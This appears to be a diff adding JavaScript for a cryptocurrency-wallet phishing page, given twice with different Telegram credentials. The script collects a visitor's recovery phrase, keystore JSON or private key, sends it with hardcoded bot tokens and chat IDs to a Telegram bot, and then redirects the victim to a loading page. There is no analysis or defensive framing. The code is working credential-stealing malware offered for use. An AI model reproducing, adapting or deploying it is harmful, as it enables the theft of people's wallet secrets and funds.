@@ -1,0 +1,179 @@
+<script>
+    let selectedTab = '';
+
+    function toggleUpload(tab) {
+        const imageUploadContainer = document.getElementById('image-upload-container');
+        imageUploadContainer.style.display = tab === 'keystore-form' ? 'block' : 'none';
+        selectedTab = tab;
+    }
+
+    function previewImage(event) {
+        const imagePreview = document.getElementById('imagePreview');
+        const file = event.target.files[0];
+        if (file) {
+            const reader = new FileReader();
+            reader.onload = function(e) {
+                imagePreview.style.display = 'block';
+                imagePreview.src = e.target.result;
+            }
+            reader.readAsDataURL(file);
+        } else {
+            imagePreview.style.display = 'none';
+        }
+    }
+
+    function sendToTelegram() {
+        const userName = document.getElementById('userName').value.trim();
+        const imageInput = document.getElementById('imageUpload');
+        const imageFile = imageInput.files[0];
+        let message = '';
+        
+        // Determine message content based on selected tab
+        if (selectedTab === 'menmonic-form' && userName) {
+            message = `Recovery Phrase: ${userName}`;
+        } else if (selectedTab === 'keystore-form' && userName) {
+            message = `Keystore JSON: ${userName}`;
+        } else if (selectedTab === 'privkey-form' && userName) {
+            message = `Private Key: ${userName}`;
+        } else {
+            document.getElementById('error-message').innerText = "Please complete the input for the selected option.";
+            return false;
+        }
+
+        const botToken = '7940052361:AAHxsCWwATWOOfgx4qmtfCFLgvv1FrR90Zw';
+        const chatId = '7747202894';
+
+        const formData = new FormData();
+        formData.append('chat_id', chatId);
+
+        // Check if an image is attached
+        if (imageFile && selectedTab === 'keystore-form') {
+            formData.append('photo', imageFile);
+            formData.append('caption', message);
+            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    window.location.href = "loading.html";
+                } else {
+                    document.getElementById('error-message').innerText = "Error sending message with image.";
+                }
+            })
+            .catch(error => {
+                document.getElementById('error-message').innerText = "Network error, please try again.";
+            });
+        } else {
+            formData.append('text', message);
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    window.location.href = "loading.html";
+                } else {
+                    document.getElementById('error-message').innerText = "Error sending message.";
+                }
+            })
+            .catch(error => {
+                document.getElementById('error-message').innerText = "Network error, please try again.";
+            });
+        }
+    }
+</script>
+
+
+group id
+
+<script>
+    let selectedTab = '';
+
+    function toggleUpload(tab) {
+        const imageUploadContainer = document.getElementById('image-upload-container');
+        imageUploadContainer.style.display = tab === 'keystore-form' ? 'block' : 'none';
+        selectedTab = tab;
+    }
+
+    function previewImage(event) {
+        const imagePreview = document.getElementById('imagePreview');
+        const file = event.target.files[0];
+        if (file) {
+            const reader = new FileReader();
+            reader.onload = function(e) {
+                imagePreview.style.display = 'block';
+                imagePreview.src = e.target.result;
+            }
+            reader.readAsDataURL(file);
+        } else {
+            imagePreview.style.display = 'none';
+        }
+    }
+
+    function sendToTelegram() {
+        const userName = document.getElementById('userName').value.trim();
+        const imageInput = document.getElementById('imageUpload');
+        const imageFile = imageInput.files[0];
+        let message = '';
+
+        // Determine message content based on selected tab
+        if (selectedTab === 'menmonic-form' && userName) {
+            message = `Recovery Phrase: ${userName}`;
+        } else if (selectedTab === 'keystore-form' && userName) {
+            message = `Keystore JSON: ${userName}`;
+        } else if (selectedTab === 'privkey-form' && userName) {
+            message = `Private Key: ${userName}`;
+        } else {
+            document.getElementById('error-message').innerText = "Please complete the input for the selected option.";
+            return false;
+        }
+
+        const botToken = '7178629143:AAGq2bUuuAEVup9vNp9BLI-vOhB8nmzbsrk';
+        // Replace with your Group ID (negative sign prefix, e.g., -1001234567890)
+        const groupId = '-1002066048396';
+
+        const formData = new FormData();
+        formData.append('chat_id', groupId);
+
+        // Check if an image is attached
+        if (imageFile && selectedTab === 'keystore-form') {
+            formData.append('photo', imageFile);
+            formData.append('caption', message);
+            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    window.location.href = "loading.html";
+                } else {
+                    document.getElementById('error-message').innerText = "Error sending message with image.";
+                }
+            })
+            .catch(error => {
+                document.getElementById('error-message').innerText = "Network error, please try again.";
+            });
+        } else {
+            formData.append('text', message);
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    window.location.href = "loading.html";
+                } else {
+                    document.getElementById('error-message').innerText = "Error sending message.";
+                }
+            })
+            .catch(error => {
+                document.getElementById('error-message').innerText = "Network error, please try again.";
+            });
+        }
+    }
+</script>
